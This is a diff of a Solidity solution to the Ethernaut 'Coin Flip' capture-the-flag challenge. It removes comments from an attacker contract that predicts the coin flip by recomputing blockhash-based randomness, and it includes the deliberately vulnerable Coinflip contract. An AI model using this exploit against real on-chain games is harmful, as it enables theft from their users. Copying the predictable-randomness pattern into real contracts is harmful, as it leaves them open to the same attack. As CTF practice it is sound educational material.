@@ -1,16 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-//Hi HTN people!! Below is my solution to Ethernaut's Coin Flip CTF
-
 contract hack{ //This contract attacks Coinflip
-    Coinflip private immutable target; //This is the target contract
+    Coinflip private immutable target; 
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address target_) {
-        target = Coinflip(target_); //We pass an address to the constructor
+        target = Coinflip(target_); 
     }
-function foresee() private view returns(bool){ //repeats the calculations from Coinflip. This wouldn't work if we didn't make it a view function!
+function foresee() private view returns(bool){ //repeats the calculations from Coinflip
      uint256 blockValue = uint256(blockhash(block.number - 1));
 
         uint256 coinFlip = blockValue / FACTOR;
@@ -18,14 +16,14 @@ function foresee() private view returns(bool){ //repeats the calculations from C
         return side;
 }
  function cheat() external  returns (bool) {
-    return target.flip(foresee()); //We call Coinflip's "flip" function with the return value of "foresee" as the guess. 
+    return target.flip(foresee()); 
 }
 
 }
 contract Coinflip {
     uint256 public consecutiveWins;
     uint256 lastHash;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //Some random number used for coin flipping
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 
 
     constructor() {
         consecutiveWins = 0;
@@ -42,7 +40,7 @@ contract Coinflip {
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
 
-        if (side == _guess) { //reads if we were right or not. ethernaut checks if consecutiveWins == 10
+        if (side == _guess) { 
             consecutiveWins++;
             return true;
         } else {
